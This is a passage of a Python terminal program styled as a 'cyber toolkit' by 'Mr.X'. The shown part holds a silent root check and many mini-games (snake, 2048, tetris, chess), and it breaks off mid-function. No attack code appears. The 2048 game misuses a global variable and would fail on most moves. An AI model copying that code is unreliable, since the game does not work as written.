#!/usr/bin/env python3
import os
import sys
import time
import random
import requests
import socket
import ssl
import subprocess
import re
from bs4 import BeautifulSoup
# Colors
R = "\033[1;91m"
G = "\033[1;92m"
Y = "\033[1;93m"
W = "\033[1;97m"
C = "\033[1;96m"
D = "\033[0m"
# Base directory
BASE_DIR = os.path.join(os.environ['HOME'], 'Blood')
CONFIG_DIR = os.path.join(BASE_DIR, 'config')
os.makedirs(CONFIG_DIR, exist_ok=True)
# Optional import for games (curses)
try:
    import curses
except ImportError:
    curses = None
# ======================
# 🔍 ROOT DETECTION (100% SILENT)
# ======================
def is_root():
    if os.path.exists("/data/data/com.termux"):
        try:
            result = subprocess.run(
                ["su", "-c", "true"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                timeout=2
            )
            return result.returncode == 0
        except (FileNotFoundError, OSError, subprocess.TimeoutExpired):
            return False
    else:
        try:
            return os.geteuid() == 0
        except:
            return False
def clear():
    os.system('clear')
def banner():
    clear()
    print(f"""{R}
██████╗ ██╗      ██████╗  ██████╗ ██████╗
██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝██║     ██║   ██║██║   ██║██║  ██║
██╔══██╗██║     ██║   ██║██║   ██║██║  ██║
██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝
╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝
{Y}Created by: {W}Mr.X  {G}v2.0 (Real Cyber Toolkit){D}
""")
def exit_tool():
    print(f"\n{Y}Goodbye, Mr.X! Stay ethical.{D}")
    sys.exit(0)
# ======================
# 🛡️ SAFE GAME RUNNER (Ctrl+C handler)
# ======================
def safe_game_runner(game_func):
    try:
        game_func()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"{R}[!] Error in game: {e}{D}")
        time.sleep(1)
# ======================
# 🎮 MINI GAMES — ALL FUNCTIONS
# ======================
def play_sssnake():
    if curses is None:
        print(f"{R}[!] 'curses' module not available. Run in Termux with built-in Python.{D}")
        input(f"\n{C}Press ENTER...")
        return
    class SnakeGame:
        def __init__(self, stdscr):
            self.stdscr = stdscr
            curses.curs_set(0)
            self.sh, self.sw = self.stdscr.getmaxyx()
            self.w = curses.newwin(self.sh, self.sw, 0, 0)
            self.w.keypad(1)
            self.w.timeout(100)
            self.snake_x = self.sw // 4
            self.snake_y = self.sh // 2
            self.snake = [
                [self.snake_y, self.snake_x],
                [self.snake_y, self.snake_x - 1],
                [self.snake_y, self.snake_x - 2]
            ]
            self.food = [self.sh // 2, self.sw // 2]
            self.w.addch(self.food[0], self.food[1], curses.ACS_PI)
            self.key = curses.KEY_RIGHT
        def run(self):
            while True:
                next_key = self.w.getch()
                self.key = self.key if next_key == -1 else next_key
                if self.snake[0][0] in [0, self.sh - 1] or \
                   self.snake[0][1] in [0, self.sw - 1] or \
                   self.snake[0] in self.snake[1:]:
                    break
                new_head = [self.snake[0][0], self.snake[0][1]]
                if self.key == curses.KEY_DOWN:
                    new_head[0] += 1
                elif self.key == curses.KEY_UP:
                    new_head[0] -= 1
                elif self.key == curses.KEY_LEFT:
                    new_head[1] -= 1
                elif self.key == curses.KEY_RIGHT:
                    new_head[1] += 1
                self.snake.insert(0, new_head)
                if self.snake[0] == self.food:
                    self.food = None
                    while self.food is None:
                        nf = [
                            random.randint(1, self.sh - 2),
                            random.randint(1, self.sw - 2)
                        ]
                        self.food = nf if nf not in self.snake else None
                    self.w.addch(self.food[0], self.food[1], curses.ACS_PI)
                else:
                    tail = self.snake.pop()
                    self.w.addch(tail[0], tail[1], ' ')
                self.w.addch(self.snake[0][0], self.snake[0][1], curses.ACS_CKBOARD)
            self.w.addstr(self.sh // 2, self.sw // 2 - 5, "GAME OVER", curses.A_BOLD)
            self.w.refresh()
            time.sleep(2)
    try:
        curses.wrapper(lambda stdscr: SnakeGame(stdscr).run())
    except:
        pass
    input(f"\n{C}Press ENTER...")
def play_guess_number():
    clear()
    banner()
    print(f"{Y}🎮 NUMBER GUESSING GAME (1–100){D}")
    print(f"{C}You have 7 attempts!{D}\n")
    number = random.randint(1, 100)
    attempts = 0
    max_attempts = 7
    while attempts < max_attempts:
        try:
            guess = int(input(f"{W}Attempt {attempts+1}: {W}"))
            attempts += 1
            if guess < number:
                print(f"{R}Too low!{D}")
            elif guess > number:
                print(f"{R}Too high!{D}")
            else:
                print(f"{G}✅ Congratulations! You guessed it in {attempts} tries.{D}")
                break
        except ValueError:
            print(f"{Y}Enter a valid number.{D}")
    else:
        print(f"{R}❌ Attempts exhausted! Answer: {number}{D}")
    input(f"\n{C}Press ENTER...")
def play_tictactoe():
    clear()
    banner()
    board = [' ' for _ in range(9)]
    def print_board():
        print(f"\n{board[0]} | {board[1]} | {board[2]} ")
        print("---+---+---")
        print(f" {board[3]} | {board[4]} | {board[5]} ")
        print("---+---+---")
        print(f" {board[6]} | {board[7]} | {board[8]}\n")
    def check_win(player):
        win_cond = [
            [0,1,2],[3,4,5],[6,7,8],
            [0,3,6],[1,4,7],[2,5,8],
            [0,4,8],[2,4,6]
        ]
        return any(all(board[i] == player for i in line) for line in win_cond)
    def is_full():
        return ' ' not in board
    print(f"{Y}🎮 TIC-TAC-TOE (X = You, O = AI){D}")
    while True:
        print_board()
        try:
            move = int(input(f"{W}Choose position (1–9): {W}")) - 1
            if move < 0 or move > 8 or board[move] != ' ':
                print(f"{R}Invalid position!{D}")
                continue
            board[move] = 'X'
            if check_win('X'):
                print_board()
                print(f"{G}✅ You win!{D}")
                break
            if is_full():
                print_board()
                print(f"{Y}Draw!{D}")
                break
            empty = [i for i, x in enumerate(board) if x == ' ']
            ai_move = random.choice(empty)
            board[ai_move] = 'O'
            if check_win('O'):
                print_board()
                print(f"{R}💀 AI wins!{D}")
                break
            if is_full():
                print_board()
                print(f"{Y}Draw!{D}")
                break
        except (ValueError, IndexError):
            print(f"{R}Enter a number from 1–9.{D}")
    input(f"\n{C}Press ENTER...")
def play_hangman():
    clear()
    banner()
    words = ["python", "blood", "termux", "hacker", "mrx", "whomrx", "snake", "phishing", "exploit"]
    word = random.choice(words).upper()
    guessed = set()
    tries = 6
    def draw_hangman(t):
        stages = [
            " _______\n|     |\n|     O\n|    /|\\\n|    / \\\n_|_",
            " _______\n|     |\n|     O\n|    /|\\\n|    /\n_|_",
            " _______\n|     |\n|     O\n|    /|\\\n|\n_|_",
            " _______\n|     |\n|     O\n|    /|\n|\n_|_",
            " _______\n|     |\n|     O\n|     |\n|\n_|_",
            " _______\n|     |\n|     O\n|\n|\n_|_",
            " _______\n|     |\n|\n|\n|\n_|_"
        ]
        print(f"\n{stages[t]}")
    print(f"{Y}🎮 HANGMAN — Guess the secret word!{D}")
    while tries > 0:
        draw_hangman(tries)
        display = ' '.join([c if c in guessed else '_' for c in word])
        print(f"\n{W}Word: {display}")
        if '_' not in display:
            print(f"\n{G}🎉 Congratulations! You guessed: {word}{D}")
            break
        if guessed:
            print(f"{C}Previous guesses: {', '.join(sorted(guessed))}")
        guess = input(f"\n{W}Guess a letter: {W}").upper()
        if not guess.isalpha() or len(guess) != 1:
            print(f"{R}Enter a single letter!{D}")
            continue
        if guess in guessed:
            print(f"{Y}Already guessed!{D}")
            continue
        guessed.add(guess)
        if guess not in word:
            tries -= 1
            print(f"{R}Wrong! Lives left: {tries}{D}")
    else:
        draw_hangman(0)
        print(f"\n{R}💀 GAME OVER! Answer: {word}{D}")
    input(f"\n{C}Press ENTER...")
def play_2048():
    clear()
    banner()
    print(f"{Y}🎮 2048 — Slide tiles to merge!{D}")
    print(f"{C}Controls: w/a/s/d → ENTER{D}")
    grid = [[0]*4 for _ in range(4)]
    def add_new():
        empty = [(r,c) for r in range(4) for c in range(4) if grid[r][c] == 0]
        if empty:
            r, c = random.choice(empty)
            grid[r][c] = 2 if random.random() < 0.9 else 4
    def compress(row):
        new = [x for x in row if x != 0]
        while len(new) < 4:
            new.append(0)
        return new
    def merge(row):
        for i in range(3):
            if row[i] != 0 and row[i] == row[i+1]:
                row[i] *= 2
                row[i+1] = 0
        return row
    def move_left():
        moved = False
        for r in range(4):
            old = grid[r][:]
            grid[r] = compress(grid[r])
            grid[r] = merge(grid[r])
            grid[r] = compress(grid[r])
            if old != grid[r]:
                moved = True
        return moved
    def rotate():
        return [list(x) for x in zip(*grid[::-1])]
    def move(direction):
        global grid
        if direction == 'a':
            return move_left()
        elif direction == 'd':
            grid = [row[::-1] for row in grid]
            moved = move_left()
            grid = [row[::-1] for row in grid]
            return moved
        elif direction == 'w':
            grid = rotate()
            moved = move_left()
            grid = [row[::-1] for row in zip(*grid)][::-1]
            return moved
        elif direction == 's':
            grid = [row[::-1] for row in zip(*grid)][::-1]
            moved = move_left()
            grid = rotate()
            return moved
        return False
    def print_grid():
        clear()
        banner()
        print(f"{Y}🎮 2048 — Slide tiles to merge!{D}")
        print(f"{C}w/a/s/d → ENTER | q = Quit{D}\n")
        for row in grid:
            print(' '.join(f"{str(x):>4}" if x else "    " for x in row))
        print()
    add_new()
    add_new()
    while True:
        print_grid()
        if any(2048 in row for row in grid):
            print(f"{G}🎉 2048! You win!{D}")
            break
        if all(grid[r][c] != 0 for r in range(4) for c in range(4)):
            print(f"{R}💀 No moves left. Game over.{D}")
            break
        key = input(f"{W}Move (w/a/s/d): {W}").strip().lower()
        if key == 'q':
            break
        if key in 'wasd':
            if move(key):
                add_new()
        else:
            print(f"{R}Invalid move!{D}")
            time.sleep(0.5)
    input(f"\n{C}Press ENTER...")
def play_minesweeper():
    clear()
    banner()
    print(f"{Y}🎮 MINESWEEPER (5x5, 3 mines){D}")
    print(f"{C}Format: row col (e.g., 1 2) | Ctrl+C to return to menu{D}")
    size = 5
    mines = 3
    board = [[0 for _ in range(size)] for _ in range(size)]
    revealed = [[False for _ in range(size)] for _ in range(size)]
    mine_pos = random.sample([(r,c) for r in range(size) for c in range(size)], mines)
    for r, c in mine_pos:
        board[r][c] = -1
        for dr in [-1,0,1]:
            for dc in [-1,0,1]:
                nr, nc = r+dr, c+dc
                if 0 <= nr < size and 0 <= nc < size and board[nr][nc] != -1:
                    board[nr][nc] += 1
    def print_board():
        clear()
        banner()
        print(f"{Y}🎮 MINESWEEPER — 0 = safe, number = adjacent mines{D}")
        print(f"{C}Format: row col (e.g., 1 2)\n")
        print("   " + " ".join(str(i+1) for i in range(size)))
        for i in range(size):
            row = []
            for j in range(size):
                if revealed[i][j]:
                    if board[i][j] == -1:
                        row.append("💣")
                    else:
                        row.append(str(board[i][j]) if board[i][j] > 0 else " ")
                else:
                    row.append("■")
            print(f"{i+1} |" + "|".join(row) + "|")
        print()
    def reveal(r, c):
        if revealed[r][c]:
            return True
        revealed[r][c] = True
        if board[r][c] == -1:
            return False
        if board[r][c] == 0:
            for dr in [-1,0,1]:
                for dc in [-1,0,1]:
                    nr, nc = r+dr, c+dc
                    if 0 <= nr < size and 0 <= nc < size:
                        reveal(nr, nc)
        return True
    safe_cells = size*size - mines
    revealed_count = 0
    print_board()
    try:
        while revealed_count < safe_cells:
            try:
                inp = input(f"{W}Open cell (row col): {W}").split()
                if len(inp) != 2:
                    print(f"{R}Format: two numbers (e.g., 1 2){D}")
                    continue
                r, c = int(inp[0])-1, int(inp[1])-1
                if not (0 <= r < size and 0 <= c < size):
                    print(f"{R}Position out of bounds!{D}")
                    time.sleep(1)
                    continue
                if not reveal(r, c):
                    print_board()
                    print(f"{R}💀 Mine hit! Game over.{D}")
                    input(f"\n{C}Press ENTER...")
                    return
                revealed_count = sum(revealed[i][j] for i in range(size) for j in range(size))
            except ValueError:
                print(f"{R}Enter valid numbers!{D}")
                time.sleep(1)
        print_board()
        print(f"{G}🎉 Congratulations! You win!{D}")
        input(f"\n{C}Press ENTER...")
    except KeyboardInterrupt:
        pass
def play_rps():
    clear()
    banner()
    print(f"{Y}🎮 ROCK PAPER SCISSORS{D}")
    choices = ["rock", "paper", "scissors"]
    wins = 0
    rounds = 0
    while True:
        print(f"\n{C}Score: {wins} wins out of {rounds} rounds{D}")
        user = input(f"{W}Choose (rock/paper/scissors) or 'q' to quit: {W}").strip().lower()
        if user == 'q':
            break
        if user not in choices:
            print(f"{R}Invalid choice!{D}")
            continue
        bot = random.choice(choices)
        print(f"{G}Bot chose: {bot}{D}")
        if user == bot:
            print(f"{Y}Draw!{D}")
        elif (user == "rock" and bot == "scissors") or \
             (user == "scissors" and bot == "paper") or \
             (user == "paper" and bot == "rock"):
            print(f"{G}✅ You win!{D}")
            wins += 1
        else:
            print(f"{R}💀 You lose!{D}")
        rounds += 1
        time.sleep(1)
    print(f"\n{C}Final score: {wins} out of {rounds}{D}")
    input(f"\n{C}Press ENTER...")
def play_sudoku():
    clear()
    banner()
    print(f"{Y}🎮 SUDOKU 4×4 — Fill digits 1–4 without duplicates per row/col/block{D}")
    puzzle = [
        [0, 0, 4, 0],
        [0, 0, 0, 2],
        [0, 3, 0, 0],
        [1, 0, 0, 0]
    ]
    solution = [
        [2, 1, 4, 3],
        [3, 4, 1, 2],
        [4, 3, 2, 1],
        [1, 2, 3, 4]
    ]
    board = [row[:] for row in puzzle]
    def print_board():
        clear()
        banner()
        print(f"{Y}🎮 SUDOKU 4×4{D}")
        print("Enter digits 1–4. Format: row col num (e.g., 1 2 3)")
        print("Type 'q' to quit\n")
        print("  ", end="")
        for i in range(4):
            print(f" {i+1}", end="")
        print("\n+-------+")
        for i in range(4):
            print(f"{i+1} |", end="")
            for j in range(4):
                val = board[i][j]
                if puzzle[i][j] == 0:
                    print(f" {val if val else '.'}", end="")
                else:
                    print(f" {val}", end="")
            print(" |")
        print("  +-------+\n")
    print_board()
    while True:
        inp = input(f"{W}Enter (row col num) or 'q': {W}").strip().lower()
        if inp == 'q':
            return
        try:
            parts = inp.split()
            if len(parts) != 3:
                raise ValueError
            r, c, num = int(parts[0]) - 1, int(parts[1]) - 1, int(parts[2])
            if not (0 <= r < 4 and 0 <= c < 4 and 1 <= num <= 4):
                print(f"{R}Values out of bounds!{D}")
                time.sleep(1)
                continue
            if puzzle[r][c] != 0:
                print(f"{R}Fixed cell! Cannot change.{D}")
                time.sleep(1)
                continue
            board[r][c] = num
            print_board()
            if board == solution:
                print(f"{G}🎉 Congratulations! Sudoku solved!{D}")
                input(f"\n{C}Press ENTER...")
                return
        except:
            print(f"{R}Invalid input!{D}")
            time.sleep(1)
def play_blackjack():
    clear()
    banner()
    print(f"{Y}🎮 BLACKJACK — Target: 21 or closest{D}")
    def deal_card():
        return random.choice([2,3,4,5,6,7,8,9,10,10,10,10,11])
    def hand_value(hand):
        value = sum(hand)
        aces = hand.count(11)
        while value > 21 and aces:
            value -= 10
            aces -= 1
        return value
    player = [deal_card(), deal_card()]
    dealer = [deal_card(), deal_card()]
    while True:
        clear()
        banner()
        print(f"\nDealer: [{dealer[0]}, ?]")
        print(f"You: {player} → Total: {hand_value(player)}\n")
        if hand_value(player) > 21:
            print(f"{R}💀 Bust! You lose.{D}")
            break
        if hand_value(player) == 21:
            print(f"{G}🎉 Blackjack! You win!{D}")
            break
        action = input(f"{W}[h]it / [s]tand? {W}").strip().lower()
        if action == 'h':
            player.append(deal_card())
        elif action == 's':
            while hand_value(dealer) < 17:
                dealer.append(deal_card())
            clear()
            banner()
            print(f"\nDealer: {dealer} → Total: {hand_value(dealer)}")
            print(f"You: {player} → Total: {hand_value(player)}\n")
            d_val = hand_value(dealer)
            p_val = hand_value(player)
            if d_val > 21 or p_val > d_val:
                print(f"{G}🎉 You win!{D}")
            elif p_val == d_val:
                print(f"{Y}Draw!{D}")
            else:
                print(f"{R}💀 Dealer wins.{D}")
            break
        else:
            print(f"{R}Type 'h' or 's'!{D}")
            time.sleep(1)
    input(f"\n{C}Press ENTER...")
def play_tetris_mini():
    if curses is None:
        print(f"{R}[!] 'curses' not available. Tetris cannot run.{D}")
        input(f"\n{C}Press ENTER...")
        return
    class Tetris:
        def __init__(self, stdscr):
            self.stdscr = stdscr
            curses.curs_set(0)
            self.h, self.w = 20, 10
            self.board = [[0] * self.w for _ in range(self.h)]
            self.score = 0
            self.level = 1
            self.lines = 0
            self.current_piece = self.new_piece()
            self.next_piece = self.new_piece()
            self.game_over = False
        def new_piece(self):
            pieces = [
                [[1, 1, 1, 1]],  # I
                [[1, 1], [1, 1]],  # O
                [[0, 1, 0], [1, 1, 1]],  # T
                [[0, 1, 1], [1, 1, 0]],  # S
                [[1, 1, 0], [0, 1, 1]],  # Z
                [[1, 0, 0], [1, 1, 1]],  # J
                [[0, 0, 1], [1, 1, 1]]   # L
            ]
            return random.choice(pieces)
        def rotate_piece(self, piece):
            return [[piece[len(piece)-1-j][i] for j in range(len(piece))] for i in range(len(piece[0]))]
        def valid_position(self, piece, offset_r, offset_c):
            for r, row in enumerate(piece):
                for c, val in enumerate(row):
                    if val:
                        nr, nc = r + offset_r, c + offset_c
                        if nr >= self.h or nc < 0 or nc >= self.w or (nr >= 0 and self.board[nr][nc]):
                            return False
            return True
        def merge_piece(self, piece, offset_r, offset_c):
            for r, row in enumerate(piece):
                for c, val in enumerate(row):
                    if val:
                        nr = r + offset_r
                        if 0 <= nr < self.h:
                            self.board[nr][c + offset_c] = 1
        def clear_lines(self):
            lines_cleared = 0
            for r in range(self.h - 1, -1, -1):
                if all(self.board[r]):
                    del self.board[r]
                    self.board.insert(0, [0] * self.w)
                    lines_cleared += 1
            if lines_cleared > 0:
                points = [0, 100, 300, 500, 800]
                self.score += points[lines_cleared] * self.level
                self.lines += lines_cleared
                self.level = self.lines // 10 + 1
            return lines_cleared
        def draw(self):
            self.stdscr.clear()
            for r in range(self.h):
                for c in range(self.w):
                    ch = '█' if self.board[r][c] else ' '
                    self.stdscr.addstr(r + 1, c * 2 + 2, ch)
            for r, row in enumerate(self.current_piece):
                for c, val in enumerate(row):
                    if val:
                        nr = r + self.piece_row
                        nc = c + self.piece_col
                        if 0 <= nr < self.h and 0 <= nc < self.w:
                            self.stdscr.addstr(nr + 1, nc * 2 + 2, '█', curses.A_BOLD)
            self.stdscr.addstr(0, 2, f"Score: {self.score}")
            self.stdscr.addstr(0, 20, f"Level: {self.level}")
            self.stdscr.addstr(self.h + 2, 2, "Controls: ← → ↑ ↓ Space | Q: quit")
            self.stdscr.refresh()
        def run(self):
            self.piece_row, self.piece_col = 0, self.w // 2 - 1
            if not self.valid_position(self.current_piece, self.piece_row, self.piece_col):
                self.game_over = True
            base_delay = 0.5
            while not self.game_over:
                self.draw()
                delay = max(0.05, base_delay - (self.level - 1) * 0.05)
                self.stdscr.timeout(int(delay * 1000))
                key = self.stdscr.getch()
                if key == ord('q'):
                    break
                old_r, old_c, old_piece = self.piece_row, self.piece_col, self.current_piece
                if key == curses.KEY_LEFT:
                    self.piece_col -= 1
                    if not self.valid_position(self.current_piece, self.piece_row, self.piece_col):
                        self.piece_col += 1
                elif key == curses.KEY_RIGHT:
                    self.piece_col += 1
                    if not self.valid_position(self.current_piece, self.piece_row, self.piece_col):
                        self.piece_col -= 1
                elif key == curses.KEY_UP:
                    rotated = self.rotate_piece(self.current_piece)
                    if self.valid_position(rotated, self.piece_row, self.piece_col):
                        self.current_piece = rotated
                elif key == curses.KEY_DOWN:
                    self.piece_row += 1
                    if not self.valid_position(self.current_piece, self.piece_row, self.piece_col):
                        self.piece_row -= 1
                        self.merge_piece(self.current_piece, self.piece_row, self.piece_col)
                        self.clear_lines()
                        self.current_piece = self.next_piece
                        self.next_piece = self.new_piece()
                        self.piece_row, self.piece_col = 0, self.w // 2 - 1
                        if not self.valid_position(self.current_piece, self.piece_row, self.piece_col):
                            self.game_over = True
                elif key == ord(' '):
                    while self.valid_position(self.current_piece, self.piece_row + 1, self.piece_col):
                        self.piece_row += 1
                    self.merge_piece(self.current_piece, self.piece_row, self.piece_col)
                    self.clear_lines()
                    self.current_piece = self.next_piece
                    self.next_piece = self.new_piece()
                    self.piece_row, self.piece_col = 0, self.w // 2 - 1
                    if not self.valid_position(self.current_piece, self.piece_row, self.piece_col):
                        self.game_over = True
                else:
                    self.piece_row += 1
                    if not self.valid_position(self.current_piece, self.piece_row, self.piece_col):
                        self.piece_row -= 1
                        self.merge_piece(self.current_piece, self.piece_row, self.piece_col)
                        self.clear_lines()
                        self.current_piece = self.next_piece
                        self.next_piece = self.new_piece()
                        self.piece_row, self.piece_col = 0, self.w // 2 - 1
                        if not self.valid_position(self.current_piece, self.piece_row, self.piece_col):
                            self.game_over = True
                        continue
            self.stdscr.timeout(-1)
            self.stdscr.addstr(self.h // 2, 5, "GAME OVER", curses.A_BOLD)
            self.stdscr.addstr(self.h // 2 + 1, 5, f"Final Score: {self.score}")
            self.stdscr.addstr(self.h // 2 + 2, 5, "Press any key...")
            self.stdscr.refresh()
            self.stdscr.getch()
    try:
        curses.wrapper(lambda scr: Tetris(scr).run())
    except:
        pass
    input(f"\n{C}Press ENTER...")
def play_memory_match():
    clear()
    banner()
    print(f"{Y}🎮 MEMORY MATCH — Match symbol pairs!{D}")
    symbols = ['★','★','♥','♥','♦','♦','♠','♠','♣','♣','☁','☁','☀','☀','🌙','🌙']
    random.shuffle(symbols)
    board = [['■'] * 4 for _ in range(4)]
    revealed = [[False]*4 for _ in range(4)]
    moves = 0
    def print_board():
        clear()
        banner()
        print(f"{Y}🎮 MEMORY MATCH — {moves} moves{D}")
        print("\n1 2 3 4")
        for i in range(4):
            print(f"{i+1} ", end="")
            for j in range(4):
                if revealed[i][j]:
                    idx = i*4 + j
                    print(symbols[idx], end=" ")
                else:
                    print(board[i][j], end=" ")
            print()
    pairs = 0
    try:
        while pairs < 8:
            print_board()
            coords = []
            for _ in range(2):
                while True:
                    try:
                        inp = input(f"{W}Select cell {_+1} (row col): {W}").split()
                        r, c = int(inp[0])-1, int(inp[1])-1
                        if 0 <= r < 4 and 0 <= c < 4 and not revealed[r][c]:
                            coords.append((r,c))
                            revealed[r][c] = True
                            break
                        else:
                            print(f"{R}Invalid or already opened position!{D}")
                    except:
                        print(f"{R}Format: number space number (e.g., 1 2){D}")
            print_board()
            moves += 1
            (r1,c1), (r2,c2) = coords
            idx1, idx2 = r1*4 + c1, r2*4 + c2
            if symbols[idx1] != symbols[idx2]:
                time.sleep(1)
                revealed[r1][c1] = False
                revealed[r2][c2] = False
            else:
                pairs += 1
        print(f"{G}🎉 Completed in {moves} moves!{D}")
        input(f"\n{C}Press ENTER...")
    except KeyboardInterrupt:
        pass
def play_number_puzzle():
    clear()
    banner()
    print(f"{Y}🎮 15-PUZZLE (4×4) — Arrange numbers 1–15 in order{D}")
    solved = list(range(1,16)) + [0]
    board = solved[:]
    random.shuffle(board)
    while not (lambda b: sum(1 for i in range(len(b)) for j in range(i+1, len(b)) if b[i] > b[j] and b[i] != 0 and b[j] != 0) % 2 == 0)(board):
        random.shuffle(board)
    def find_zero():
        return board.index(0)
    def move_tile(direction):
        z = find_zero()
        r, c = divmod(z, 4)
        if direction == 'w' and r < 3:
            target = z + 4
        elif direction == 's' and r > 0:
            target = z - 4
        elif direction == 'a' and c < 3:
            target = z + 1
        elif direction == 'd' and c > 0:
            target = z - 1
        else:
            return False
        board[z], board[target] = board[target], board[z]
        return True
    def print_board():
        clear()
        banner()
        print(f"{Y}🎮 15-PUZZLE — w/a/s/d to move, q to quit{D}\n")
        for i in range(4):
            row = []
            for j in range(4):
                val = board[i*4 + j]
                row.append(f"{val:2}" if val else "  ")
            print(" ".join(row))
        print()
    try:
        while board != solved:
            print_board()
            key = input(f"{W}Move (w/a/s/d): {W}").strip().lower()
            if key == 'q':
                return
            if key in 'wasd':
                move_tile(key)
            else:
                print(f"{R}Invalid move!{D}")
                time.sleep(0.5)
        print_board()
        print(f"{G}🎉 Puzzle solved!{D}")
        input(f"\n{C}Press ENTER...")
    except KeyboardInterrupt:
        pass
def play_rpg_mini():
    clear()
    banner()
    print(f"{Y}🎮 RPG MINI — Mr.X's Cyber Adventure{D}")
    print(f"{C}Your character: Warrior (HP: 100, ATK: 15){D}\n")
    player = {
        'name': 'Mr.X',
        'hp': 100,
        'max_hp': 100,
        'atk': 15,
        'gold': 0,
        'level': 1,
        'exp': 0
    }
    def fight(monster):
        print(f"\n{R}💀 Enemy appeared: {monster['name']} (HP: {monster['hp']}, ATK: {monster['atk']}){D}")
        while player['hp'] > 0 and monster['hp'] > 0:
            dmg = random.randint(player['atk'] - 3, player['atk'] + 3)
            monster['hp'] -= dmg
            print(f"{G}You attack! {monster['name']} takes {dmg} damage.{D}")
            if monster['hp'] <= 0:
                print(f"{G}✅ You defeated {monster['name']}!{D}")
                player['gold'] += monster['gold']
                player['exp'] += monster['exp']
                print(f"{Y}+{monster['gold']} gold | +{monster['exp']} EXP{D}")
                if player['exp'] >= player['level'] * 50:
                    player['level'] += 1
                    player['max_hp'] += 20
                    player['hp'] = player['max_hp']
                    player['atk'] += 5
                    print(f"{C}🎉 LEVEL UP! Level {player['level']} — HP & ATK increased!{D}")
                return True
            dmg = random.randint(monster['atk'] - 2, monster['atk'] + 2)
            player['hp'] -= dmg
            print(f"{R}{monster['name']} attacks! You take {dmg} damage. HP: {player['hp']}/{player['max_hp']}{D}")
        return False
    monsters = [
        {'name': 'Phisher', 'hp': 30, 'atk': 8, 'gold': 10, 'exp': 20},
        {'name': 'Malware', 'hp': 45, 'atk': 12, 'gold': 15, 'exp': 30},
        {'name': 'Ransomware', 'hp': 60, 'atk': 18, 'gold': 25, 'exp': 40},
        {'name': 'Zero-Day', 'hp': 100, 'atk': 25, 'gold': 50, 'exp': 80}
    ]
    try:
        while player['hp'] > 0:
            clear()
            banner()
            print(f"{Y}🎮 RPG MINI — Level {player['level']}{D}")
            print(f"{G}HP: {player['hp']}/{player['max_hp']} | ATK: {player['atk']}{D}")
            print(f"{Y}Gold: {player['gold']} | EXP: {player['exp']}{D}")
            print(f"\n{C}[1]{W} Find enemy")
            print(f"{C}[2]{W} Rest (heal 30 HP)")
            print(f"{C}[3]{W} Exit")
            choice = input(f"\n{W}Select: {W}").strip()
            if choice == '1':
                monster = random.choice(monsters[:min(player['level'], len(monsters))])
                m = monster.copy()
                won = fight(m)
                if not won:
                    print(f"\n{R}💀 You were defeated by {monster['name']}!{D}")
                    break
                input(f"\n{C}Press ENTER...")
            elif choice == '2':
                heal = 30
                player['hp'] = min(player['max_hp'], player['hp'] + heal)
                print(f"{G}✅ You rested. HP +{heal}{D}")
                time.sleep(1)
            elif choice == '3':
                break
            else:
                print(f"{R}Invalid choice.{D}")
                time.sleep(1)
        if player['hp'] <= 0:
            print(f"\n{R}💀 GAME OVER. Total gold: {player['gold']}{D}")
        else:
            print(f"\n{G}🌟 Adventure completed. Final gold: {player['gold']}{D}")
    except KeyboardInterrupt:
        pass
    input(f"\n{C}Press ENTER...")
def play_chess_vs_ai():
    clear()
    banner()
    print(f"{Y}🎮 CHESS vs AI — You: White | AI: Black{D}")
    print(f"{C}How to play:{D}")
    print(f"  - Move format: {G}e2e4{D} (from e2 to e4)")
    print(f"  - Examples: {G}g1f3{D}, {G}e7e5{D}, {G}h2h4{D}")
    print(f"  - Use coordinate notation as shown below")
    print(f"  - Type '{Y}q{D}' to quit, '{Y}undo{D}' to undo move\n")
    class ChessGameAI:
        def __init__(self):
            self.board = [
                ['r','n','b','q','k','b','n','r'],
                ['p','p','p','p','p','p','p','p'],
                [' ',' ',' ',' ',' ',' ',' ',' '],
                [' ',' ',' ',' ',' ',' ',' ',' '],
                [' ',' ',' ',' ',' ',' ',' ',' '],
                [' ',' ',' ',' ',' ',' ',' ',' '],
                ['P','P','P','P','P','P','P','P'],
                ['R','N','B','Q','K','B','N','R']
            ]
            self.turn = 'white'
            self.move_history = []
            self.king_moved = {'white': False, 'black': False}
            self.rook_moved = {'white': {'left': False, 'right': False},
                               'black': {'left': False, 'right': False}}
            self.en_passant = None
        def print_board(self):
            clear()
            banner()
            print(f"{Y}🎮 CHESS vs AI — You (White) vs AI (Black){D}")
            print(f"{C}Format: e2e4 | undo | q{D}\n")
            print("    a b c d e f g h")
            for i in range(8):
                row = 8 - i
                print(f" {row}  {' '.join(self.board[i])}  {row}")
            print("    a b c d e f g h\n")
        def pos_to_index(self, pos):
            if len(pos) != 2: return None
            col = ord(pos[0].lower()) - ord('a')
            try:
                row = 8 - int(pos[1])
            except:
                return None
            if 0 <= row < 8 and 0 <= col < 8:
                return (row, col)
            return None
        def index_to_pos(self, row, col):
            return chr(ord('a') + col) + str(8 - row)
        def is_white(self, piece): return piece in 'KQRBNP'
        def is_black(self, piece): return piece in 'kqrbnp'
        def path_clear(self, fr_row, fr_col, to_row, to_col):
            step_r = 0 if fr_row == to_row else (1 if to_row > fr_row else -1)
            step_c = 0 if fr_col == to_col else (1 if to_col > fr_col else -1)
            r, c = fr_row + step_r, fr_col + step_c
            while (r, c) != (to_row, to_col):
                if self.board[r][c] != ' ': return False
                r += step_r; c += step_c
            return True
        def can_attack(self, fr_row, fr_col, to_row, to_col):
            piece = self.board[fr_row][fr_col]
            if piece == ' ': return False
            if piece.lower() == 'p':
                dir = -1 if self.is_white(piece) else 1
                return to_row == fr_row + dir and abs(to_col - fr_col) == 1
            elif piece.lower() == 'r':
                return (fr_row == to_row or fr_col == to_col) and self.path_clear(fr_row, fr_col, to_row, to_col)
            elif piece.lower() == 'n':
                dr, dc = abs(to_row - fr_row), abs(to_col - fr_col)
                return (dr == 2 and dc == 1) or (dr == 1 and dc == 2)
            elif piece.lower() == 'b':
                return abs(to_row - fr_row) == abs(to_col - fr_col) and self.path_clear(fr_row, fr_col, to_row, to_col)
            elif piece.lower() == 'q':
                return ((fr_row == to_row or fr_col == to_col or abs(to_row - fr_row) == abs(to_col - fr_col)) and
                        self.path_clear(fr_row, fr_col, to_row, to_col))
            elif piece.lower() == 'k':
